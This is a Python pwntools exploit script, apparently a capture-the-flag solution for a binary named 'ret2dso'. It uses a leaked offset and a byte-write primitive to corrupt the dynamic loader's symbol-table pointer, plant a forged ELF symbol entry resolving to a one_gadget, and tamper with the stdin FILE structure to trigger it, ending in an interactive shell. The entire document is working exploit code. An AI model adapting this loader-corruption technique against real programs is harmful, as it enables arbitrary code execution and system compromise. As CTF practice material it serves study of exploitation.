from pwn import *

context.binary = ELF("dist/ret2dso")
context.log_level = "info"

STDIN_VTABLE_OFFSET       = 0xd8
LDBASE_WRITABLE_OFFSET    = 0x3a000
LINFO_SYMTAB_OFFSET       = 0xb60
DSO_SYM_ENTRY_OFFSET      = 0x208
ONE_GADGET_OFFSET         = 0x12ee1a

def drift_write(io, target, data):
    for i, b in enumerate(data):
        io.sendline(f"{target + i} {b:02x}".encode())

p = remote("localhost", 1447)

p.recvuntil(b"distance: ")
entropy = int(p.recvline().strip(), 16)

# Compute forged st_value so that st_value + l_addr == one_gadget
st_value = -(entropy + ONE_GADGET_OFFSET) & 0xffffffffffffffff

# Fake ELF symbol entry: all fields copied except st_value
fake_sym = (
    p64(0x19) +                    # st_name (copied)
    p64(0xd001200000020) +         # st_info / st_other / st_shndx / st_size
    p64(st_value)                  # forged st_value
)

# 1. Redirect DT_SYMTAB pointer inside loader metadata
target = entropy + LDBASE_WRITABLE_OFFSET + LINFO_SYMTAB_OFFSET
drift_write(p, target, b"\xf0")

# 2. Overwrite a concrete symbol entry with the forged Elf64_Sym
target = entropy + LDBASE_WRITABLE_OFFSET + DSO_SYM_ENTRY_OFFSET
drift_write(p, target, fake_sym)

# 3. Corrupt a single byte in stdin FILE structure to trigger resolution
target = STDIN_VTABLE_OFFSET + 7
drift_write(p, target, b"\xff")

p.interactive()